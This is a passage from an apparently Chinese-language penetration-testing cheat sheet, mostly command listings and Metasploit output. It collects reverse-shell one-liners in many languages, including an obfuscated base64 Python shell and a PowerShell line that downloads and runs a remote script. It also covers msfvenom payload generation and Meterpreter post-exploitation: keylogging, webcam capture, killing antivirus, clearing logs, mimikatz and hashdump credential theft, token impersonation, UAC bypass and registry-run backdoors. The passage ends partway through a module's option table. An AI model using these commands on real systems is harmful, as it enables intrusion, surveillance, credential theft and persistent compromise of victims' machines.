title="反弹shell(流量太敏感，尽量加密用)"></a>反弹shell(流量太敏感，尽量加密用)</h2><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><pre><code>nc -lvvp 4444</code></pre><h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><pre><code>bash -i &gt;&amp; /dev/tcp/172.16.1.130/4444 0&gt;&amp;1exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></pre><h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><pre><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></pre><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.41&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre><h2 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h2><pre><code>nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</code></pre><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><pre><code>r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><pre><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code></pre><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444</code></pre><h2 id="加密shell"><a href="#加密shell" class="headerlink" title="加密shell"></a>加密shell</h2><pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.100:2333 &gt; /tmp/s; rm /tmp/s</code></pre><h1 id="msf大全"><a href="#msf大全" class="headerlink" title="msf大全"></a>msf大全</h1><p><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></p><p><a href="https://www.freebuf.com/articles/web/270456.html">https://www.freebuf.com/articles/web/270456.html</a></p><p><a href="https://saucer-man.com/information_security/79.html">https://saucer-man.com/information_security/79.html</a></p><p><a href="https://www.anquanke.com/post/id/235631">https://www.anquanke.com/post/id/235631</a></p><p><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装</p><pre><code class="bash"># 安装curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall安装目录 # /opt/metasploit-framework/embedded/framework/</code></pre><p>安装2</p><pre><code>wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.runchmod +x ./metasploit-latest-linux-x64-installer.run./metasploit-latest-linux-x64-installer.run</code></pre><p>payload生成</p><p>Linux</p><pre><code class="bash">反向连接：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.9 LPORT=4444 -f raw &gt; revshell.bin正向连接：msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=6666 -f elf &gt; bind.elf</code></pre><p>Windows</p><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.9 LPORT=4444 -f raw &gt; shell.binmsfvenom -p windows/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=808 -f exe &gt; shell.exe</code></pre><p>Mac</p><pre><code class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f macho &gt; shell.macho</code></pre><p>PHP</p><pre><code class="bash">msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><p>ASP</p><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f asp &gt; shell.asp</code></pre><p>JSP</p><pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.jsp</code></pre><p>WAR</p><pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f war &gt; shell.war</code></pre><p>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p><pre><code class="bash">php shell.php</code></pre><p>3.脚本shell</p><p>Python</p><pre><code class="bash">msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.py</code></pre><p>Bash</p><pre><code class="bash">msfvenom -p cmd/unix/reverse_bash LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.sh</code></pre><p>Perl</p><pre><code class="bash">msfvenom -p cmd/unix/reverse_perl LHOST=127.0.0.1 LPORT=808 -f raw &gt; shell.pl</code></pre><p>执行方式：复制shell.py中的内容在linux命令行下执行：</p><pre><code>python -c &quot;exec(&#39;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#39;.decode(&#39;base64&#39;))&quot;</code></pre><p>4.shellcode<br>Linux Based Shellcode</p><pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f &lt;language&gt;</code></pre><p>Windows Based Shellcode</p><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f &lt;language&gt;</code></pre><p>Mac Based Shellcode</p><pre><code class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f &lt;language&gt;</code></pre><h2 id="Meterpreter基本命令"><a href="#Meterpreter基本命令" class="headerlink" title="Meterpreter基本命令"></a>Meterpreter基本命令</h2><p>首先需要先获取meterpreter：</p><pre><code class="bash">use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp#set payload linux/x64/meterpreter/reverse_tcpset LHOST 0.0.0.0set lPORT 6789set ExitOnSession falseexploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)jobs  # 查看后台攻击任务 kill &lt;id&gt;  # 停止某后台攻击任务 sessions -l  # (查看会话)sessions -i 2   # 选择会话sessions -k 2   # 结束会话</code></pre><p>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。</p><p>获取到了meterpreter，就可以进行后渗透了。</p><h3 id="基本系统命令"><a href="#基本系统命令" class="headerlink" title="基本系统命令"></a>基本系统命令</h3><pre><code class="bash"># 会话管理background  #将当前会话放置后台sessions  # 查看会话sessions -i  # 切换会话quit  # 关闭当前的会话，返回msf终端# 系统设置sysinfo  # 查看目标机系统信息idletime  # 查看目标机闲置时间reboot/shutdown   # 重启/关机# shellshell  # 获得控制台权限irb  # 进入ruby终端# 进程迁移getpid    # 获取当前进程的pidps   # 查看当前活跃进程migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt;   #杀死进程migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中# 执行文件execute #在目标机中执行文件execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互# 摄像头命令webcam_list  #查看摄像头列表webcam_chat  # 查看摄像头接口webcam_snap   #通过摄像头拍照webcam_stream   #通过摄像头开启视频# uictl开关键盘/鼠标uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标uictl disable mouse  #禁用鼠标uictl disable keyboard  #禁用键盘# 远程桌面/截屏enumdesktops  #查看可用的桌面getdesktop    #获取当前meterpreter 关联的桌面screenshot  #截屏use espia  #或者使用espia模块截屏  然后输入screengrabrun vnc  #使用vnc远程桌面连接# 键盘记录keyscan_start  #开始键盘记录keyscan_dump   #导出记录数据keyscan_stop #结束键盘记录# 添加用户，开启远程桌面# 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令run post/windows/manage/enable_rdp  #开启远程桌面run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662# 关闭防病毒软件run killavrun post/windows/manage/killav# 修改注册表reg –h # 注册表命令帮助upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传ncreg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的keyreg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#39;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#39; #设置键值reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值nc -v 192.168.81.162 443  #攻击者连接nc后门# 清理日志clearav  #清除windows中的应用程序日志、系统日志、安全日志</code></pre><h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><pre><code class="bash">cat/ls/cd/rm  # 基本命令search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助getwd/pwd  # 获取当前目录getlwd/lpwd   # 操作攻击者主机 查看当前目录upload /tmp/hack.txt C:\\lltest # 上传文件download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件mkdir lltest2  # 只能在当前目录下创建文件夹rmdir lltest2  # 只能删除当前目录下文件夹lcd /tmp   # 操作攻击者主机 切换目录# timestomp伪造文件时间戳timestomp C:// -h   #查看帮助timestomp -v C://2.txt   #查看时间戳timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</code></pre><h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><pre><code class="bash"># 基本ipconfig/ifconfignetstat –anoarpgetproxy   #查看代理信息route   #查看路由# portfwd端口转发portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码# 添加路由# 方式一autoroute （deprecated）run autoroute –h #查看帮助run autoroute -s 192.168.2.0/24  #添加到目标环境网络run autoroute –p  #查看添加的路由# 方式二post/multi/manage/autorouterun post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络run post/multi/manage/autoroute CMD=print # 查看添加的路由(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))# 然后可以利用arp_scanner、portscan等进行存活检测run arp_scanner -r 192.168.2.0/24run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0# autoroute添加完路由后，还可以利用msf自带的模块进行socks代理# msf提供了2个模块用来做socks代理。# auxiliary/server/socks_proxy# use auxiliary/server/socks_unc# 先background退出来，然后：use auxiliary/server/socks_proxyset srvhost 127.0.0.1set srvport 1080run# 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080# 最后proxychains 使用Socks5代理访问## msf 代理设置set proxies socks5:127.0.0.1:30801set ReverseAllowProxy true# sniffer抓包use sniffersniffer_interfaces   #查看网卡sniffer_start 2   #选择网卡 开始抓包sniffer_stats 2   #查看状态sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包sniffer_stop 2   #停止抓包</code></pre><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><pre><code class="bash"># 信息收集的脚本位于：# modules/post/windows/gather# modules/post/linux/gather# 以下列举一些常用的run post/windows/gather/checkvm #是否虚拟机run post/linux/gather/checkvm #是否虚拟机run post/windows/gather/forensics/enum_drives #查看分区run post/windows/gather/enum_applications #获取安装软件信息run post/windows/gather/dumplinks   #获取最近的文件操作run post/windows/gather/enum_ie  #获取IE缓存run post/windows/gather/enum_chrome   #获取Chrome缓存run post/windows/gather/enum_patches  #补丁信息run post/windows/gather/enum_domain  #查找定位域控run post/windows/gather/enum_logged_on_users  #登录过的用户</code></pre><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p><pre><code class="bash">getsystem  </code></pre><p>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。</p><p>msf提供了如下几个模块帮助绕过UAC：</p><pre><code class="bash">msf5 auxiliary(server/socks5) &gt; search bypassuacMatching Modules================   #  Name                                              Disclosure Date  Rank       Check  Description   -  ----                                              ---------------  ----       -----  -----------   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</code></pre><p>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong></p><pre><code class="bash"># 示例meterpreter &gt; getuidServer username: SAUCERMAN\TideSecmeterpreter &gt; background[*] Backgrounding session 4...msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuacmsf5 exploit(windows/local/bypassuac) &gt; set SESSION 4SESSION =&gt; 4msf5 exploit(windows/local/bypassuac) &gt; run[-] Handler failed to bind to 192.168.81.160:4444:-  -[-] Handler failed to bind to 0.0.0.0:4444:-  -[*] UAC is Enabled, checking level...[+] UAC is set to Default[+] BypassUAC can bypass this setting, continuing...[+] Part of Administrators group! Continuing...[*] Uploaded the agent to the filesystem....[*] Uploading the bypass UAC executable to the filesystem...[*] Meterpreter stager executable 73802 bytes long being uploaded..[*] Sending stage (206403 bytes) to 192.168.81.154[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700[-] Exploit failed [timeout-expired]: Timeout::Error execution expired[*] Exploit completed, but no session was created.# 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功# 然鹅这里失败了</code></pre><p>3.内核漏洞提权</p><p>无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。</p><pre><code class="bash">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息msf5 &gt; use exploit/windows/local/ms13_053_schlampereimsf5 &gt; set SESSION 2msf5 &gt; exploit# 示例meterpreter &gt; run post/windows/gather/enum_patches[+] KB2871997 is missing[+] KB2928120 is missing[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1meterpreter &gt; background[*] Backgrounding session 4...msf5 exploit(windows/local/bypassuac) &gt; search MS13-081Matching Modules================   #  Name                                             Disclosure Date  Rank     Check  Description   -  ----                                             ---------------  ----     -----  -----------   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Pagemsf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menumsf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4session =&gt; 4msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit[!] SESSION may not be compatible with this module.[-] Handler failed to bind to 192.168.81.160:4444:-  -[-] Handler failed to bind to 0.0.0.0:4444:-  -[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported[*] Exploit completed, but no session was created.# 然鹅失败了，摸摸头</code></pre><h3 id="获取凭证"><a href="#获取凭证" class="headerlink" title="获取凭证"></a>获取凭证</h3><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。</p><p>1.使用mimikatz</p><pre><code class="bash">load mimikatz    #help mimikatz 查看帮助wdigest  #获取Wdigest密码mimikatz_command -f samdump::hashes  #执行mimikatz原始命令mimikatz_command -f sekurlsa::searchPasswords# 示例meterpreter &gt; load mimikatzLoading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#39;load kiwi&#39; instead?Success.meterpreter &gt; wdigest[!] Not currently running as SYSTEM[*] Attempting to getprivs ...[+] Got SeDebugPrivilege.[*] Retrieving wdigest credentialswdigest credentials===================AuthID    Package    Domain        User           Password------    -------    ------        ----           --------0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  0;996     Negotiate  WORKGROUP     SAUCERMAN$     0;48748   NTLM                                    0;999     NTLM       WORKGROUP     SAUCERMAN$     0;476238  NTLM       SAUCERMAN     TideSec        1234560;476209  NTLM       SAUCERMAN     TideSec        123456meterpreter &gt; mimikatz_command -f samdump::hashesOrdinateur : saucermanBootKey    : 691cff33caf49e933be97fcee370256aRegOpenKeyEx SAM : (0x00000005) �ݿ� Erreur lors de l&#39;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</code></pre><ol><li>使用meterpreter的run hashdump命令</li></ol><pre><code class="bash">meterpreter &gt; run hashdump[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...][*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a.../opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Obtaining the user list and keys...[*] Decrypting user keys.../opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Dumping password hints...TideSec:&quot;123456&quot;[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</code></pre><p>3.post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</p><p>从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code></p><pre><code class="bash">meterpreter &gt; run post/windows/gather/smart_hashdump[*] Running module against SAUCERMAN[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt[*] Dumping password hashes...[*] Running as SYSTEM extracting hashes from registry[*]     Obtaining the boot key...[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...[*]     Obtaining the user list and keys...[*]     Decrypting user keys...[*]     Dumping password hints...[+]     TideSec:&quot;123456&quot;[*]     Dumping password hashes...[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</code></pre><p>4.powerdump<br>同 hashdump，但失败了</p><pre><code class="bash">meterpreter &gt; run powerdump[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...[*] Running PowerDump to extract Username and Password Hashes...[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...[*] Setting ExecutionPolicy to Unrestricted...[*] Dumping the SAM database through PowerShell...[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</code></pre><h3 id="假冒令牌"><a href="#假冒令牌" class="headerlink" title="假冒令牌"></a>假冒令牌</h3><p>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。</p><p>msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。</p><pre><code class="bash"># 1.incognito假冒令牌use incognito      #help incognito  查看帮助list_tokens -u    #查看可用的tokenimpersonate_token &#39;NT AUTHORITY\SYSTEM&#39;  #假冒SYSTEM token或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\execute -f cmd.exe -i –t    # -t 使用假冒的token 执行或者直接shellrev2self   #返回原始token# 2.steal_token窃取令牌steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps,找域控进程drop_token  #删除窃取的token</code></pre><h3 id="植入后门"><a href="#植入后门" class="headerlink" title="植入后门"></a>植入后门</h3><p>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。</p><p>1.persistence启动项后门</p><p>路径：metasploit&#x2F;scripts&#x2F;meterpreter&#x2F;persistence</p><p>原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong></p><pre><code class="bash">run persistence –h  #查看帮助run persistence -X -i 5 -p 4444 -r 192.168.81.160#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip# 示例meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444[*] Persistent agent script is 99630 bytes long[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs[+] Agent executed with PID 3540[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</code></pre><p>能实现同样功能的脚本还有：exploit&#x2F;windows&#x2F;local&#x2F;persistence</p><p>2.metsvc服务后门</p><p>在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*</p><pre><code class="bash">run metsvc –A   #自动安装后门# 示例meterpreter &gt; run metsvc –A[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Creating a meterpreter service on port 31337[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...[*]  &gt;&gt; Uploading metsrv.x86.dll...[*]  &gt;&gt; Uploading metsvc-server.exe...[*]  &gt;&gt; Uploading metsvc.exe...[*] Starting the service...    Cannot open service manager (0x00000005)meterpreter &gt; lsListing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH========================================================Mode              Size    Type  Last modified              Name----              ----    ----  -------------              ----100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</code></pre><p>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。</p><p>3.persistence_exe</p><p>再来看看官方推荐的东西吧</p><pre><code class="bash">meterpreter &gt; info post/windows/manage/persistence_exe       Name: Windows Manage Persistent EXE Payload Installer     Module: post/windows/manage/persistence_exe   Platform: Windows       Arch:        Rank: NormalProvided by:  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;Compatible session types:  MeterpreterBasic options:  Name      Current Setting  Required  Description  ----      ---------------  --------  -----------  REXENAME  default.exe      yes       The name to call exe on remote system  REXEPATH                   yes       The remote executable to upload and execute.  SESSION                    yes       The session to run this module on.  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)Description:  This Module will upload an executable to a remote host and make it   Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER   will start on user login, SYSTEM will start on system boot but   requires privs. SERVICE will create a new service which will start   the payload. Again requires privs.Module options (post/windows/manage/persistence_exe):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   REXENAME  default.exe      yes       The name to call exe on remote system   REXEPATH                   yes       The remote executable to upload and execute.   SESSION                    yes       The session to run this module on.   